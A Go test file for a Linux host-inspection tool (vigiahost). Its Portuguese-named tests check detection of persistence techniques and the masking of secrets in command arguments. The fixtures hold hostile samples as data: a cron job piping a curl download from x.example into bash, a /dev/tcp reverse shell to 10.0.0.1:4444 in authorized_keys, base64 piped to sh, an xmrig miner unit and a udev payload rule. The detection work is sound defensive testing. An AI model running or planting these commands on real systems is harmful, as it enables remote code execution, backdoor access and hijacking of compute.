package inspect

import (
	"strings"
	"testing"
	"testing/fstest"

	"github.com/guigallina27/vigiahost/internal/report"
)

func file(s string) *fstest.MapFile { return &fstest.MapFile{Data: []byte(s), Mode: 0o644} }

func hitSigs(hits []Hit) map[string]string {
	m := map[string]string{}
	for _, h := range hits {
		m[h.Signature] = h.Item.Path
	}
	return m
}

func TestPersistenciaDetectaTecnicasComuns(t *testing.T) {
	root := fstest.MapFS{
		"etc/passwd": file("root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\n" +
			"site:x:1001:1001::/home/site:/bin/bash\nnobody:x:65534:65534::/:/sbin/nologin\n"),
		"etc/crontab":                                             file("# comentário com curl x | sh não conta\n*/5 * * * * root run-parts /etc/cron.hourly\n"),
		"var/spool/cron/site":                                     file("* * * * * curl -fsSL http://x.example/a.sh | bash\n"),
		"etc/systemd/system/ruim.service":                         file("[Service]\nExecStart=/tmp/.x/kworker -c cfg\n"),
		"etc/systemd/system/ok.service":                           file("[Service]\nExecStart=/usr/bin/true\n"),
		"etc/systemd/system/multi-user.target.wants/ruim.service": file("[Service]\nExecStart=/tmp/.x/kworker -c cfg\n"),
		"etc/ld.so.preload":                                       file("/usr/lib/libprocesshider.so\n"),
		"etc/pam.d/sshd":                                          file("auth required /var/tmp/pam_x.so\nauth required pam_unix.so\nsession optional pam_exec.so /usr/local/bin/log\n"),
		"etc/ssh/sshd_config":                                     file("AuthorizedKeysCommand /usr/local/bin/keys\n"),
		"root/.ssh/authorized_keys":                               file(`command="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" ssh-ed25519 AAAA x` + "\n"),
		"home/site/.bashrc":                                       file("alias ls='ls --color'\necho Y3VybA== | base64 -d | sh\n"),
		"home/site/.config/systemd/user/m.service":                file("[Service]\nExecStart=/home/site/.cache/xmrig --donate-level 1\n"),
		"etc/sudoers.d/deploy":                                    file("deploy ALL=(ALL) NOPASSWD: ALL\n%wheel ALL=(ALL) NOPASSWD: ALL\n"),
		"etc/udev/rules.d/99-x.rules":                             file(`ACTION=="add", RUN+="/dev/shm/payload"` + "\n"),
		"etc/systemd/system-generators/gen":                       file("#!/bin/sh\n"),
	}
	homes := Homes(root, 1000)
	if strings.Join(homes, ",") != "/root,/home/site" {
		t.Fatalf("diretórios pessoais: %v", homes)
	}
	items := (&Collector{Root: root, Homes: homes}).Collect()
	hits := hitSigs(Analyze(items))
	want := map[string]string{
		"persistencia.download_e_execucao":           "/var/spool/cron/site",
		"persistencia.unidade_executa_de_temporario": "/etc/systemd/system/multi-user.target.wants/ruim.service",
		"persistencia.ld_so_preload":                 "/etc/ld.so.preload",
		"persistencia.pam_modulo_fora_do_padrao":     "/etc/pam.d/sshd",
		"persistencia.pam_exec":                      "/etc/pam.d/sshd",
		"persistencia.ssh_authorized_keys_command":   "/etc/ssh/sshd_config",
		"persistencia.chave_ssh_com_comando":         "/root/.ssh/authorized_keys",
		"persistencia.base64_executado":              "/home/site/.bashrc",
		"persistencia.minerador":                     "/home/site/.config/systemd/user/m.service",
		"persistencia.sudo_sem_senha":                "/etc/sudoers.d/deploy",
		"persistencia.udev_executa_de_temporario":    "/etc/udev/rules.d/99-x.rules",
		"persistencia.gerador_systemd":               "/etc/systemd/system-generators/gen",
	}
	for sig, p := range want {
		got, ok := hits[sig]
		if !ok {
			t.Errorf("faltou %s (%s)", sig, p)
			continue
		}
		if sig != "persistencia.unidade_executa_de_temporario" && got != p {
			t.Errorf("%s em %s, esperado %s", sig, got, p)
		}
	}
	for sig, p := range hits {
		if p == "/etc/crontab" || p == "/etc/systemd/system/ok.service" {
			t.Errorf("falso positivo %s em %s", sig, p)
		}
	}
	if !strings.HasPrefix(itemByPath(items, "/root/.ssh/authorized_keys").Entry.Detail, "1 chave") {
		t.Errorf("resumo das chaves: %q", itemByPath(items, "/root/.ssh/authorized_keys").Entry.Detail)
	}
}

func itemByPath(items []Item, p string) Item {
	for _, it := range items {
		if it.Entry.Path == p {
			return it
		}
	}
	return Item{}
}

func TestDiferencaEntreInventarios(t *testing.T) {
	root := fstest.MapFS{
		"etc/passwd":                file("root:x:0:0:root:/root:/bin/bash\n"),
		"root/.ssh/authorized_keys": file("ssh-ed25519 AAAA a\n"),
		"etc/cron.d/backup":         file("0 2 * * * root /usr/local/bin/backup\n"),
	}
	c := &Collector{Root: root, Homes: Homes(root, 1000)}
	first := c.Collect()
	if removed := Diff(first, nil); removed != nil || first[0].Entry.Change != "" {
		t.Fatal("primeira inspeção é a referência, sem mudanças")
	}
	prev := Inventory(first)
	root["root/.ssh/authorized_keys"] = file("ssh-ed25519 AAAA a\nssh-ed25519 BBBB invasor\n")
	delete(root, "etc/cron.d/backup")
	root["etc/sudoers.d/novo"] = file("x ALL=(ALL) ALL\n")
	second := c.Collect()
	removed := Diff(second, prev)
	hits := hitSigs(ChangeHits(second, removed))
	for _, sig := range []string{"persistencia.authorized_keys_changed", "persistencia.sudoers_added", "persistencia.cron_removed"} {
		if _, ok := hits[sig]; !ok {
			t.Errorf("faltou %s: %v", sig, hits)
		}
	}
}

func TestMascaraSegredosDaLinhaDeComando(t *testing.T) {
	got := MaskArgs([]string{"/usr/bin/mysql", "-uroot", "-pSegredo1", "--password", "abc", "token=xyz",
		"https://user:senha@repo.example/x", "--db-password=p@ss", "normal"})
	joined := strings.Join(got, " ")
	for _, leak := range []string{"Segredo1", "abc", "xyz", "senha", "p@ss"} {
		if strings.Contains(joined, leak) {
			t.Errorf("vazou %q em %q", leak, joined)
		}
	}
	if !strings.Contains(joined, "normal") || !strings.Contains(joined, "https://user:****@repo.example/x") {
		t.Errorf("mascaramento exagerado: %q", joined)
	}
}

var _ = report.SeverityInfo

func TestConteudoBinarioNaoPassaPelasRegrasDeTexto(t *testing.T) {
	root := fstest.MapFS{
		"etc/passwd": file("root:x:0:0:root:/root:/bin/bash\n"),
		"etc/systemd/system-generators/compilado": &fstest.MapFile{Data: []byte("\x7fELF\x00\x00 /tmp/x ; curl a | sh\n"), Mode: 0o755},
	}
	hits := hitSigs(Analyze((&Collector{Root: root, Homes: Homes(root, 1000)}).Collect()))
	if _, ok := hits["persistencia.execucao_em_temporario"]; ok {
		t.Errorf("regra de texto aplicada a binário: %v", hits)
	}
	if _, ok := hits["persistencia.gerador_systemd"]; !ok {
		t.Errorf("o gerador continua listado: %v", hits)
	}
}
